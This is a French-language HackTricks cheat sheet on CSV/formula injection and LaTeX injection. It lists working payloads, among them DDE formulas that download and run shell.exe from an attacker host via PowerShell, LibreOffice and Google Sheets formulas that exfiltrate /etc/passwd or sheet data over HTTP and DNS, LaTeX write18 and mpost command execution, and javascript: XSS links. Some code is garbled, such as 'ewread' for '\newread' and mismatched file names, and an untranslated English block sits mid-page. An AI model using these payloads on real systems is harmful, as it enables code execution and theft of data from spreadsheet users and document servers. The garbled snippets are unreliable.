# Injection de formules/CSV/Doc/LaTeX

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFT**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## Injection de formules

### Info

Si votre **entr√©e** est **r√©fl√©chie** dans des fichiers **CSV** (ou tout autre fichier qui sera probablement ouvert par **Excel**), vous pouvez peut-√™tre mettre des **formules Excel** qui seront **ex√©cut√©es** lorsque l'utilisateur **ouvre le fichier** ou lorsque l'utilisateur **clique sur un lien** dans la feuille Excel.

{% hint style="danger" %}
De nos jours, **Excel alertera** (plusieurs fois) l'utilisateur lorsqu'un √©l√©ment est charg√© depuis l'ext√©rieur d'Excel afin de l'emp√™cher de r√©aliser des actions malveillantes. Par cons√©quent, un effort particulier doit √™tre appliqu√© √† l'ing√©nierie sociale pour la charge utile finale.
{% endhint %}

### [Liste de mots](https://github.com/payloadbox/csv-injection-payloads)
```
DDE ("cmd";"/C calc";"!A0")A0
@SUM(1+9)*cmd|' /C calc'!A0
=10+20+cmd|' /C calc'!A0
=cmd|' /C notepad'!'A1'
=cmd|'/C powershell IEX(wget attacker_server/shell.exe)'!A0
=cmd|'/c rundll32.exe \\10.0.0.1\3\2\1.dll,0'!_xlbgnm.A1
```
### Hyperlien

**L'exemple suivant est tr√®s utile pour exfiltrer du contenu de la feuille Excel finale et effectuer des demandes vers des emplacements arbitraires. Mais cela n√©cessite que l'utilisateur clique sur le lien (et accepte les avertissements).**

Exemple tir√© de [https://payatu.com/csv-injection-basic-to-exploit](https://payatu.com/csv-injection-basic-to-exploit)

Prenons un sc√©nario d'attaque du syst√®me de gestion des dossiers √©tudiants d'une √©cole. L'application permet aux enseignants d'entrer les d√©tails des √©tudiants de l'√©cole. L'attaquant acc√®de √† l'application et veut que tous les enseignants utilisant l'application soient compromis. L'attaquant essaie donc de r√©aliser une attaque d'injection CSV via l'application web.\
L'attaquant doit voler les d√©tails d'autres √©tudiants. L'attaquant utilise donc la formule Hyperlien et l'entre pendant la saisie des d√©tails de l'√©tudiant.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_008.png)

Lorsque l'enseignant exporte le CSV et clique sur le lien hypertexte, les donn√©es sensibles sont envoy√©es au serveur de l'attaquant.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_009.png)

Le fichier CSV export√© contient une charge utile malveillante.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_010.png)

Les d√©tails de l'√©tudiant sont enregistr√©s sur le serveur web de l'attaquant.

![](https://payatu.com/wp-content/uploads/2017/11/Selection\_011.png)

### RCE

Pour que cet exemple fonctionne, il est **n√©cessaire d'activer la configuration suivante**:\
Fichier ‚Üí Options ‚Üí Centre de gestion de la confidentialit√© ‚Üí Param√®tres du Centre de gestion de la confidentialit√© ‚Üí Contenu externe ‚Üí Activer le lancement du serveur d'√©change de donn√©es dynamiques\
ou l'utilisation d'une **ancienne version d'Excel**.

La bonne nouvelle est que **cette charge utile est ex√©cut√©e automatiquement lorsque le fichier est ouvert** (si l'utilisateur accepte les avertissements).

Il est possible d'ex√©cuter une calculatrice avec la charge utile suivante **`=cmd|' /C calc'!xxx`**

![](<../.gitbook/assets/image (25) (2) (2) (2) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (3).png>)

### Plus
```bash
=cmd|' /C powershell Invoke-WebRequest "http://www.attacker.com/shell.exe" -OutFile "$env:Temp\shell.exe"; Start-Process "$env:Temp\shell.exe"'!A1
```
### LFI

**LibreOffice Calc**

* Ceci lira la premi√®re ligne du fichier local /etc/passwd : `='file:///etc/passwd'#$passwd.A1`
* L'exfiltrer : `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)))`
* Exfiltrer plus d'une ligne : `=WEBSERVICE(CONCATENATE("http://:8080/",('file:///etc/passwd'#$passwd.A1)&CHAR(36)&('file:///etc/passwd'#$passwd.A2)))`
* Exfiltration DNS : `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),"."))`

**Analyse de la charge utile d'exfiltration DNS :**

* ‚Äòfile:///etc/passwd‚Äô#$passwd.A19 ‚Äì Lira la 19√®me ligne du fichier local /etc/passwd
* ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19) ‚Äì Encode l'URL des donn√©es retourn√©es
* MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41) ‚Äì Similaire √† substring, lit les donn√©es du 1er caract√®re au 41√®me - une fa√ßon tr√®s pratique de limiter la longueur des noms d'h√¥tes DNS (limite de 254 caract√®res pour FQDN et 63 caract√®res pour un label, c'est-√†-dire un sous-domaine)
* SUBSTITUTE(MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41),‚Äù%‚Äù,‚Äù-‚Äú) ‚Äì Remplace toutes les instances de % (le caract√®re sp√©cial de l'encodage URL) par un tiret - cela garantit que seuls des caract√®res DNS valides sont utilis√©s
* CONCATENATE((SUBSTITUTE(MID((ENCODEURL(‚Äòfile:///etc/passwd‚Äô#$passwd.A19)),1,41),‚Äù%‚Äù,‚Äù-‚Äú)),‚Äù.\<FQDN>‚Äù) ‚Äì Concat√®ne la sortie du fichier (apr√®s que le traitement ci-dessus ait eu lieu) avec le FQDN (pour lequel nous avons acc√®s √† l'h√¥te qui est autoritaire pour le domaine)
* WEBSERVICE ‚Äì Fera une demande pour ce nom DNS inexistant que nous pouvons ensuite analyser les journaux (ou ex√©cuter tcpdump etc.) sur le serveur de noms autoritaire DNS pour lequel nous avons le contr√¥le

### Google Sheets OOB Data Exfiltration

Tout d'abord, pr√©sentons certaines des fonctions les plus int√©ressantes.

**CONCATENATE** : Ajoute des cha√Ænes les unes aux autres.
```
=CONCATENATE(A2:E2)
```
**IMPORTXML**: Importe des donn√©es √† partir de diff√©rents types de donn√©es structur√©es, y compris XML, HTML, CSV, TSV et des flux XML RSS et ATOM.
```
=IMPORTXML(CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)), "//a/a10")
```
**IMPORTFEED**: Importe un flux RSS ou ATOM.
```
=IMPORTFEED(CONCAT("http://[remote IP:Port]//123.txt?v=", CONCATENATE(A2:E2)))
```
**IMPORTHTML**: Importe des donn√©es √† partir d'un tableau ou d'une liste dans une page HTML.
```
=IMPORTHTML (CONCAT("http://[remote IP:Port]/123.txt?v=", CONCATENATE(A2:E2)),"table",1)
```
**IMPORTRANGE**: Importe une plage de cellules √† partir d'une feuille de calcul sp√©cifi√©e.
```
=IMPORTRANGE("https://docs.google.com/spreadsheets/d/[Sheet_Id]", "sheet1!A2:E2")
```
**IMAGE**: Ins√®re une image dans une cellule.
```
=IMAGE("https://[remote IP:Port]/images/srpr/logo3w.png")
```
## Injection LaTeX

G√©n√©ralement, les serveurs que l'on trouve sur internet qui **convertissent le code LaTeX en PDF** utilisent **`pdflatex`**.\
Ce programme utilise 3 attributs principaux pour (d√©s)autoriser l'ex√©cution de commandes :

* **`--no-shell-escape`** : **D√©sactive** la construction `\write18{command}`, m√™me si elle est activ√©e dans le fichier texmf.cnf.
* **`--shell-restricted`** : Identique √† `--shell-escape`, mais **limit√©** √† un ensemble de \*\*commandes pr√©d√©finies** s√ªres (\*\*Sur Ubuntu 16.04, la liste se trouve dans `/usr/share/texmf/web2c/texmf.cnf`).
* **`--shell-escape`** : **Active** la construction `\write18{command}`. La commande peut √™tre n'importe quelle commande shell. Cette construction est normalement d√©sactiv√©e pour des raisons de s√©curit√©.

Cependant, il existe d'autres moyens d'ex√©cuter des commandes, il est donc tr√®s important d'utiliser `--shell-restricted` pour √©viter les RCE.

### Lire un fichier <a href="#read-file" id="read-file"></a>
```bash
\input{/etc/passwd}
\include{password} # load .tex file
\lstinputlisting{/usr/share/texmf/web2c/texmf.cnf}
\usepackage{verbatim}
\verbatiminput{/etc/passwd}
```
#### Lire un fichier d'une seule ligne
```bash
ewread\file
\openin\file=/etc/issue
\read\file to\line
\text{\line}
\closein\file
```
#### Lire un fichier √† plusieurs lignes
```bash
ewread\file
\openin\file=/etc/passwd
\loop\unless\ifeof\file
    \read\file to\fileline
    \text{\fileline}
\repeat
\closein\file
```
### √âcrire un fichier <a href="#write-file" id="write-file"></a>

---

#### Description

This technique allows an attacker to write a file on the server.

#### Vulnerable code pattern

```latex
\immediate\write18{echo "text" > /path/to/file}
```

#### Exploitation

An attacker can inject arbitrary commands in the `write18` command. For example, the following payload will execute the `id` command and write the output to `/tmp/output`:

```latex
\immediate\write18{id > /tmp/output}
```

#### Mitigation

- Avoid using the `write18` command.
- If it is necessary to use it, sanitize any user input before using it in the command.
```bash
ewwrite\outfile
\openout\outfile=cmd.tex
\write\outfile{Hello-world}
\closeout\outfile
```
### Ex√©cution de commandes <a href="#command-execution" id="command-execution"></a>

L'entr√©e de la commande sera redirig√©e vers stdin, utilisez un fichier temporaire pour l'obtenir.
```bash
\immediate\write18{env > output}
\input{output}

\input{|"/bin/hostname"}
\input{|"extractbb /etc/passwd > /tmp/b.tex"}

# allowed mpost command RCE
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (id;uname${IFS}-sm)>/tmp/pwn" "x.mp"}
\end{document}

# If mpost is not allowed there are other commands you might be able to execute
## Just get the version
\input{|"bibtex8 --version > /tmp/b.tex"}
## Search the file pdfetex.ini
\input{|"kpsewhich pdfetex.ini > /tmp/b.tex"}
## Get env var value
\input{|"kpsewhich -expand-var=$HOSTNAME > /tmp/b.tex"}
## Get the value of shell_escape_commands without needing to read pdfetex.ini
\input{|"kpsewhich --var-value=shell_escape_commands > /tmp/b.tex"}
```
Si vous rencontrez une erreur LaTex, envisagez d'utiliser base64 pour obtenir le r√©sultat sans caract√®res ind√©sirables.
```bash
\immediate\write18{env | base64 > test.tex}
\input{text.tex}
```

```bash
\input|ls|base4
\input{|"/bin/hostname"}
```
### Cross Site Scripting <a href="#cross-site-scripting" id="cross-site-scripting"></a>

De [@EdOverflow](https://twitter.com/intigriti/status/1101509684614320130)
```bash
\url{javascript:alert(1)}
\href{javascript:alert(1)}{placeholder}
```
## R√©f√©rences

* [https://notsosecure.com/data-exfiltration-formula-injection-part1](https://notsosecure.com/data-exfiltration-formula-injection-part1)
* [https://0day.work/hacking-with-latex/](https://0day.work/hacking-with-latex/)
* [https://salmonsec.com/cheatsheet/latex\_injection](https://salmonsec.com/cheatsheet/latex\_injection)
* [https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/](https://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une entreprise de **cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
